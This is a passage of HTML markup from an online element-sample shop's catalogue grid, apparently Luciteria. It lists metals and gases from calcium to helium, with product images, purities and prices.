            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483605273312-0BMZL040D2KDAHV7RJVC/ke17ZwdGBToddI8pDm48kO4syHfJdxA8ciiLqTjxf-p7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmmbLecD_NwfjqNxjfNDWHyHJzUyDPRxoFJH7M8C52PrcfsEHzoy0kxYfRLh63TMwB/Calcium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483605273312-0BMZL040D2KDAHV7RJVC/ke17ZwdGBToddI8pDm48kO4syHfJdxA8ciiLqTjxf-p7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmmbLecD_NwfjqNxjfNDWHyHJzUyDPRxoFJH7M8C52PrcfsEHzoy0kxYfRLh63TMwB/Calcium.JPG" data-image-dimensions="1435x1216" data-image-focal-point="0.5,0.5" alt="Calcium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Calcium metal 99.9%</p>
            


<p>
from <span>5.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/vitreous-carbon" id="thumb-vitreous-carbon" data-item-id="586e198903596e659c2f0233">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483610509403-Y4GZX7KQIYTSAQN7MPH2/ke17ZwdGBToddI8pDm48kHtsTYAWBaYGqW2XFg4OLRIUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcgaRjuNY8Ds1cqCjdciZv1iEZFxhxouQuXmM3Fi-eFOV52WvVYfW7wdZ4oJdqW_bH/Carbon+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483610509403-Y4GZX7KQIYTSAQN7MPH2/ke17ZwdGBToddI8pDm48kHtsTYAWBaYGqW2XFg4OLRIUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcgaRjuNY8Ds1cqCjdciZv1iEZFxhxouQuXmM3Fi-eFOV52WvVYfW7wdZ4oJdqW_bH/Carbon+%282%29.JPG" data-image-dimensions="1059x679" data-image-focal-point="0.5,0.5" alt="Carbon (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Carbon amorphous &gt;99% pure</p>
            


<p>
from <span>2.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-cerium" id="thumb-buy-cerium" data-item-id="588c3dd56a4963c410f60058">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529948138165-2MNVPQXSA4AHAX1S1VVE/ke17ZwdGBToddI8pDm48kHHGgfyvBN3T_Jf1vxGCaX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UVLBiiomvsz1F1TULjjNWDVWfgk9JG7uNQYe8qmESclG2ombBdJUk8Dc7Ch2WAU4tg/Cerium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529948138165-2MNVPQXSA4AHAX1S1VVE/ke17ZwdGBToddI8pDm48kHHGgfyvBN3T_Jf1vxGCaX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UVLBiiomvsz1F1TULjjNWDVWfgk9JG7uNQYe8qmESclG2ombBdJUk8Dc7Ch2WAU4tg/Cerium.JPG" data-image-dimensions="2362x1772" data-image-focal-point="0.5,0.5" alt="Cerium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Cerium metal 99.95% </p>
            


<p>
from <span>7.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/cesium-metal-999-1g-ampule" id="thumb-cesium-metal-999-1g-ampule" data-item-id="5ae381a22b6a28188c99bf47">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524859331280-71FMDODH4VDZP8BNCLYQ/ke17ZwdGBToddI8pDm48kKiXoxy9Ps_WDz1enCeVtbJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UWTbdRIc1vuXX0K2YWHVitwX6NiMX_A85OHMD2xWdqZc375SFZmmIz7wOg4an18cuA/Cesium+%283%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524859331280-71FMDODH4VDZP8BNCLYQ/ke17ZwdGBToddI8pDm48kKiXoxy9Ps_WDz1enCeVtbJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UWTbdRIc1vuXX0K2YWHVitwX6NiMX_A85OHMD2xWdqZc375SFZmmIz7wOg4an18cuA/Cesium+%283%29.JPG" data-image-dimensions="1897x1215" data-image-focal-point="0.5,0.5" alt="Cesium (3).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Cesium metal 99.99%</p>
            


<p>
from <span>25.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/chlorine-gas-liquefied" id="thumb-chlorine-gas-liquefied" data-item-id="5ae3821988251b24eace36d4">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524859418658-G85QX0BRIMLLCDEILFTO/ke17ZwdGBToddI8pDm48kAADtxijP_MhnkbtGyGWA_57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UfU8vBDwOiCsEbQ2hl_EOHgMmjwF_Yn99hprIdbfUAQV7d92LC9TZ0hecJ5SzQrglQ/Chlorine.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1524859418658-G85QX0BRIMLLCDEILFTO/ke17ZwdGBToddI8pDm48kAADtxijP_MhnkbtGyGWA_57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UfU8vBDwOiCsEbQ2hl_EOHgMmjwF_Yn99hprIdbfUAQV7d92LC9TZ0hecJ5SzQrglQ/Chlorine.JPG" data-image-dimensions="1535x1063" data-image-focal-point="0.5,0.5" alt="Chlorine.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Chlorine gas (liquefied) 99.9%</p>
            


<p><span>65.00</span>
</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-chromium-metal" id="thumb-buy-chromium-metal" data-item-id="586f4601e3df28fc12ef76ca">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483687462905-EIMV9ZQI0VM3AA0OWXIJ/ke17ZwdGBToddI8pDm48kHsZWZiMz0s76FDf4FWi4Kt7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UQbTVoysh_aj3RLiZftbgfq5KtjMg2SyCHvMTAcIytaHGLDe_BHBL9JV7OZzPTrWmA/Chromium.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483687462905-EIMV9ZQI0VM3AA0OWXIJ/ke17ZwdGBToddI8pDm48kHsZWZiMz0s76FDf4FWi4Kt7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UQbTVoysh_aj3RLiZftbgfq5KtjMg2SyCHvMTAcIytaHGLDe_BHBL9JV7OZzPTrWmA/Chromium.JPG" data-image-dimensions="1648x1496" data-image-focal-point="0.5,0.5" alt="Chromium.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Chromium metal 99.4% </p>
            


<p>
from <span>3.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-cobalt" id="thumb-buy-cobalt" data-item-id="586e793a6b8f5b5ff61dcd84">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1520955404268-PQG7O87LDKC5NNZ1H14P/ke17ZwdGBToddI8pDm48kGLdLNXsFLYkA3gxOmCUTxd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0q7uY_gEAXjzYg1fYWS2heRyp7wUoaTm2hvitz-NBlc2bQlofc_nfdea8PsSccog3A/Cobalt+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1520955404268-PQG7O87LDKC5NNZ1H14P/ke17ZwdGBToddI8pDm48kGLdLNXsFLYkA3gxOmCUTxd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0q7uY_gEAXjzYg1fYWS2heRyp7wUoaTm2hvitz-NBlc2bQlofc_nfdea8PsSccog3A/Cobalt+%282%29.JPG" data-image-dimensions="2500x1708" data-image-focal-point="0.5,0.5" alt="Cobalt (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Cobalt metal 99.9% </p>
            


<p>
from <span>2.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/copper-metal-9999-granules" id="thumb-copper-metal-9999-granules" data-item-id="5927934846c3c47633b90a5d">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1495765894462-1XJLH9U09M0C5E2TLYCM/ke17ZwdGBToddI8pDm48kCG5ay8BxVuGEe0zVOfp8jF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UbMbTL5Mgc4j2dYAVucMyrTZNBUjJglK4rmmLvJhyxG3jnlzPsk3eU__fePW63nezw/Copper+%283%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1495765894462-1XJLH9U09M0C5E2TLYCM/ke17ZwdGBToddI8pDm48kCG5ay8BxVuGEe0zVOfp8jF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UbMbTL5Mgc4j2dYAVucMyrTZNBUjJglK4rmmLvJhyxG3jnlzPsk3eU__fePW63nezw/Copper+%283%29.JPG" data-image-dimensions="2233x1713" data-image-focal-point="0.5,0.5" alt="Copper (3).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Copper metal 99.99% </p>
            


<p>
from <span>2.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-dysprosium" id="thumb-buy-dysprosium" data-item-id="587652fd9de4bb66f0f31a20">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1484149517165-76LTMNM0KWVRURF4LPKX/ke17ZwdGBToddI8pDm48kOiGDpckCel0QES2xrAXnosUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcdanMUvPnNls9zkADJxjwHKmrdfYVFbcI7N5TKBeVE54y0NxqtjknUcsCFwcK42Bm/Dysprosium.jpg" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1484149517165-76LTMNM0KWVRURF4LPKX/ke17ZwdGBToddI8pDm48kOiGDpckCel0QES2xrAXnosUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcdanMUvPnNls9zkADJxjwHKmrdfYVFbcI7N5TKBeVE54y0NxqtjknUcsCFwcK42Bm/Dysprosium.jpg" data-image-dimensions="1380x866" data-image-focal-point="0.5,0.5" alt="Dysprosium.jpg" data-load="false" src="https://luciteria.com/Dysprosium.jpg">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Dysprosium metal 99.5% </p>
            


<p>
from <span>3.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/dysprosium-metal-9999" id="thumb-dysprosium-metal-9999" data-item-id="5b313487352f535d36e24105">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529951376106-IXMOLBSI0KW7OLDZSOQ1/ke17ZwdGBToddI8pDm48kBiiBaIEOEVMwOVhj2dNqtl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UZeotfqBlFFwWAfObiCvabldPLh4RKEPCMHiM8F-whvezbbVudNU-r5JQDE0QnfUYA/Dysprosium+%283%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529951376106-IXMOLBSI0KW7OLDZSOQ1/ke17ZwdGBToddI8pDm48kBiiBaIEOEVMwOVhj2dNqtl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UZeotfqBlFFwWAfObiCvabldPLh4RKEPCMHiM8F-whvezbbVudNU-r5JQDE0QnfUYA/Dysprosium+%283%29.JPG" data-image-dimensions="2025x1701" data-image-focal-point="0.5,0.5" alt="Dysprosium (3).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Dysprosium metal 99.99%</p>
            


<p>
from <span>7.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-erbium" id="thumb-buy-erbium" data-item-id="586e297cb3db2bba412baac7">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529951104398-41QLW80ES7OT8Z22F0TG/ke17ZwdGBToddI8pDm48kGa3caDSfjVdcoytzkQ_AOx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mwONMR1ELp49Lyc52iWr5cbOb6sTSJ8Pzy_W2af2Mwt_vrtIu9e36xdIJExlvjcwQ/Erbium+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529951104398-41QLW80ES7OT8Z22F0TG/ke17ZwdGBToddI8pDm48kGa3caDSfjVdcoytzkQ_AOx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mwONMR1ELp49Lyc52iWr5cbOb6sTSJ8Pzy_W2af2Mwt_vrtIu9e36xdIJExlvjcwQ/Erbium+%282%29.JPG" data-image-dimensions="2500x2159" data-image-focal-point="0.5,0.5" alt="Erbium (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Erbium metal 99.9% </p>
            


<p>
from <span>3.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-europium" id="thumb-buy-europium" data-item-id="58b1093659cc684cc8715e19">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487997269129-OQQUONPITZJW4M0WORE5/ke17ZwdGBToddI8pDm48kPHcUPassUO3M_AG8dESUTx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s2R59z2HWVKMNU9GXmUK4Vw5j12ALx7hO2mJZDXNSgjM_q94FGpAX5Wn26angxIyQ/Europium+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487997269129-OQQUONPITZJW4M0WORE5/ke17ZwdGBToddI8pDm48kPHcUPassUO3M_AG8dESUTx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0s2R59z2HWVKMNU9GXmUK4Vw5j12ALx7hO2mJZDXNSgjM_q94FGpAX5Wn26angxIyQ/Europium+%282%29.JPG" data-image-dimensions="2500x2121" data-image-focal-point="0.5,0.5" alt="Europium (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Europium metal 99.95% </p>
            


<p>
from <span>7.50</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/fluorine-gas-33" id="thumb-fluorine-gas-33" data-item-id="5ae38319575d1f244b178396">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529816007481-77M7CCEOUV12HX2IAFKW/ke17ZwdGBToddI8pDm48kKkMt4pTfcSuoPcPOWHdpwx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USDWhPvfW-_FH8AK7ebGBPr1AfIx9-eg6VymIKRQuwwoBashlp-43D3kQy0wbhdyfg/Fluorine.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529816007481-77M7CCEOUV12HX2IAFKW/ke17ZwdGBToddI8pDm48kKkMt4pTfcSuoPcPOWHdpwx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USDWhPvfW-_FH8AK7ebGBPr1AfIx9-eg6VymIKRQuwwoBashlp-43D3kQy0wbhdyfg/Fluorine.JPG" data-image-dimensions="1921x1533" data-image-focal-point="0.5,0.5" alt="Fluorine.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Fluorine gas 33%</p>
            


<p><span>75.00</span>
</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-gadolinium" id="thumb-buy-gadolinium" data-item-id="586e13e903596e659c2edcb0">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483854776363-A1VGRT8EXEO8PA0LE7A6/ke17ZwdGBToddI8pDm48kCiAMkXyMHtvK7aG3QzlgZV7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UbbB2HjFJ0udPfghYVKG60C0aY9MQ51E9F2O5_EKWiDsfvSKcCiQDXJ8mOZZ-46MLw/Gadolinium+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483854776363-A1VGRT8EXEO8PA0LE7A6/ke17ZwdGBToddI8pDm48kCiAMkXyMHtvK7aG3QzlgZV7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UbbB2HjFJ0udPfghYVKG60C0aY9MQ51E9F2O5_EKWiDsfvSKcCiQDXJ8mOZZ-46MLw/Gadolinium+%282%29.JPG" data-image-dimensions="1688x1692" data-image-focal-point="0.5,0.5" alt="Gadolinium (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Gadolinium metal 99.9% piece</p>
            


<p>
from <span>3.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-gallium" id="thumb-buy-gallium" data-item-id="58768f83725e253cc71450b7">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1527027290504-TR72954H23J1XEQ9BMFQ/ke17ZwdGBToddI8pDm48kMFiMyT1nneRMhnmfuSfpxZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mlM0or4nqX7jrn5yWu0hA1QXedaIFqnAbw_tQShHbKg4-O_KAc44ak5jGzrnn7f3A/Ga40gLu.jpg" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1527027290504-TR72954H23J1XEQ9BMFQ/ke17ZwdGBToddI8pDm48kMFiMyT1nneRMhnmfuSfpxZ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0mlM0or4nqX7jrn5yWu0hA1QXedaIFqnAbw_tQShHbKg4-O_KAc44ak5jGzrnn7f3A/Ga40gLu.jpg" data-image-dimensions="2500x2000" data-image-focal-point="0.6384615384615384,0.8173076923076923" alt="Ga40gLu.jpg" data-load="false" src="https://luciteria.com/Ga40gLu.jpg">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Gallium metal 99.99%</p>
            


<p>
from <span>2.75</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-germanium" id="thumb-buy-germanium" data-item-id="586e26a959cc688e1a862dc5">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487861900139-UHQ6FJWHYMVVC5PPH32N/ke17ZwdGBToddI8pDm48kIO5WbOCe2LvV3w-w3Gfy6F7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UdrV0F62B5vd8rLIz94hsGwrJRzBhePCwO7fTxUrbT6NI71t-C_VvFs-IhUhkanjUQ/Germanium+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1487861900139-UHQ6FJWHYMVVC5PPH32N/ke17ZwdGBToddI8pDm48kIO5WbOCe2LvV3w-w3Gfy6F7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UdrV0F62B5vd8rLIz94hsGwrJRzBhePCwO7fTxUrbT6NI71t-C_VvFs-IhUhkanjUQ/Germanium+%282%29.JPG" data-image-dimensions="1772x1366" data-image-focal-point="0.33071570763221153,0.46986099243164064" alt="Germanium (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Germanium metal 99.999% </p>
            


<p>
from <span>3.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/gold-metal-9999-pure" id="thumb-gold-metal-9999-pure" data-item-id="586f4f17cd0f68f24730e3d6">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483690372232-HZI4T4TCLJGFDM0UPA17/ke17ZwdGBToddI8pDm48kE8F1gtKa43xUWd7CzTvFVF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0plef_PmwB6-3GP4qDbCUv-J5ex0CTWqsqsQIxlgM0BuWezpf6sbifK1g4Z_VNRRAw/Gold.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1483690372232-HZI4T4TCLJGFDM0UPA17/ke17ZwdGBToddI8pDm48kE8F1gtKa43xUWd7CzTvFVF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0plef_PmwB6-3GP4qDbCUv-J5ex0CTWqsqsQIxlgM0BuWezpf6sbifK1g4Z_VNRRAw/Gold.JPG" data-image-dimensions="2500x1748" data-image-focal-point="0.5,0.5" alt="Gold.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Gold metal 99.99%</p>
            


<p>
from <span>9.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/purple-gold" id="thumb-purple-gold" data-item-id="5e2a67d19bccd63beb807f66">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1579837429901-K069IU9I4MTIT7QDSVHB/ke17ZwdGBToddI8pDm48kIZ-z6G5hqF1M4axiEpxH3Z7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URJO_ZWANk6eTy0elAyJyy7-OFpJvWVAsg7-H-8omwKql2KRACfp7f1SYNW5rB-KfQ/Purple+gold.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1579837429901-K069IU9I4MTIT7QDSVHB/ke17ZwdGBToddI8pDm48kIZ-z6G5hqF1M4axiEpxH3Z7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URJO_ZWANk6eTy0elAyJyy7-OFpJvWVAsg7-H-8omwKql2KRACfp7f1SYNW5rB-KfQ/Purple+gold.JPG" data-image-dimensions="2222x1683" data-image-focal-point="0.5,0.5" alt="Purple gold.JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Purple Gold</p>
            


<p>
from <span>15.00</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/buy-hafnium" id="thumb-buy-hafnium" data-item-id="586f4dd5d1758e5863fb47dd">
      <div>

        <div>
          <div>
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529950875032-M9JQWRXC39R0S805LFFK/ke17ZwdGBToddI8pDm48kIM5r-BpmJiQ2kir_bsUMFx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0p4XabXLlNWpcJMv7FrN_NJb23TynkAKKl2qiJvySsV0cjYS_m60TNnTLAqJa41ozQ/Hafnium+%282%29.JPG" data-image="https://images.squarespace-cdn.com/content/v1/571079941bbee00fd7f0470f/1529950875032-M9JQWRXC39R0S805LFFK/ke17ZwdGBToddI8pDm48kIM5r-BpmJiQ2kir_bsUMFx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0p4XabXLlNWpcJMv7FrN_NJb23TynkAKKl2qiJvySsV0cjYS_m60TNnTLAqJa41ozQ/Hafnium+%282%29.JPG" data-image-dimensions="2500x1923" data-image-focal-point="0.5,0.5" alt="Hafnium (2).JPG" data-load="false">
              
            </p>
          </div>
        </div>

        <div>
          <div>
            <p>Hafnium metal 99.95% </p>
            


<p>
from <span>3.90</span>

</p>
            
          </div>
        </div>

        

      </div>
    </a>

  

    <a href="https://luciteria.com/elements-for-sale/helium-gas-9999" id="thumb-helium-gas-9999" data-item-id="5ae38656f950b72cb00b5093">
      <div>

